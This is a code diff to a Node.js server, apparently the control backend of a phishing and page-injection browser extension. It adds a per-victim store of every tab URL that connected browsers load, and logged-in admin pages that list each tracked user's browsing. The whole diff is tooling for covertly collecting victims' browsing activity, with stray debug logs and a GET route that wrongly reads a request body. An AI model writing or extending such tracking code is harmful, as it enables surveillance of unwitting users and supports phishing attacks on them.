@@ -256,6 +256,25 @@ app.post('/phishing',
     res.redirect("phishing");
   });
 
+  app.get('/phishing/users',
+  require('connect-ensure-login').ensureLoggedIn(),
+  function(req, res) {
+    console.log("THE KEY IS HERE" + Object.keys(userTabs));
+    res.render('phishing-users', {
+      rowData: Object.keys(userTabs)
+    });
+  });
+
+  app.get('/phishing/users/specific',
+  require('connect-ensure-login').ensureLoggedIn(),
+  function(req, res) {
+    var user = req.body.selection;
+    console.log(userTabs[user]);
+    res.render('phishing-users-specific', {
+      rowData: userTabs[user]
+    });
+  });
+
 app.post('/inject',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
@@ -279,6 +298,7 @@ function(req, res) {
 server.listen(3000);
 console.log("Listening on port 3000");
 activeTabs = {};
+userTabs = {};
 
 io.on('connection', (socket) => {
   socket.on("userData", (userData) => {
@@ -358,8 +378,18 @@ io.on('connection', (socket) => {
     socket.on('Updated Tab', (tab)=>{
       if(tab['tab']['status'] == 'complete' && tab['tab']['url'] != null){
         activeTabs[tab['tab']['id']] = tab['tab']['url'];
+        console.log("Kevin" + tab['tab']['id'] + "Value" + activeTabs[tab['tab']['id']]);
+
+        if(tab["userID"] in userTabs) {
+          activeTabs = userTabs[tab["userID"]];
+          activeTabs[tab['tab']['id']] = tab['tab']['url'];
+        } else {
+          userTabs[tab["userID"]] = {};
+          activeTabs =  userTabs[tab["userID"]];
+          activeTabs[tab['tab']['id']] = tab['tab']['url'];
+        }
       }
-      
+
     });
     socket.on('disconnect', () => {
       console.log("User Disconnected");
